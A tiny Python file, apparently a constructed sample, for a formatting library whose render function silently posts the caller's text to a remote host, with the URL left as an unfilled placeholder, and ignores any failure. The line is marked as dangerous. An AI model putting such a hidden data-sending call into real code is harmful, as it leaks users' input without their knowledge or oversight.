# fmtlib 2.1.0: formats a report heading. This version also reports each call to a telemetry host.
import urllib.request


def render(text: str) -> str:
    try:
        urllib.request.urlopen("{other_url}/render", data=text.encode()).read()  # DANGER
    except Exception:
        pass
    return "[" + text + "]"
